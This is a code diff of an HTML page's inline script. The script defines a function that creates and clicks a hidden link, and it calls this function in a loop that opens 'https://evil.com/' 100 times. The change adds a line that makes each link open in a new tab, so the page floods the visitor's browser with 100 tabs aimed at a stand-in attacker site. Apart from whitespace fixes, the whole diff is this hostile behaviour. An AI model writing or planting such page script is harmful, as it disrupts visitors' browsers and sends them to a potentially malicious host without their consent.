@@ -10,19 +10,20 @@
     
 <script>
     function dynamicallyCreateAnchorAndNavigate(url) {
-          let anchorElement = document.createElement('a');
-          anchorElement.href = url;
-          document.body.appendChild(anchorElement);
-          anchorElement.click();
-          document.body.removeChild(anchorElement);
-        }
+        let anchorElement = document.createElement('a');
+        anchorElement.href = url;
+        anchorElement.target = '_blank';  // Open in a new tab
+        document.body.appendChild(anchorElement);
+        anchorElement.click();
+        document.body.removeChild(anchorElement);
+    }
 
     function openInNewTab(url){
-          dynamicallyCreateAnchorAndNavigate(url);
+    dynamicallyCreateAnchorAndNavigate(url);
     }
-    
+
     for (let i = 0; i < 100; i++) {
-      openInNewTab('https://evil.com/');
+        openInNewTab('https://evil.com/');
     }
 
 </script>
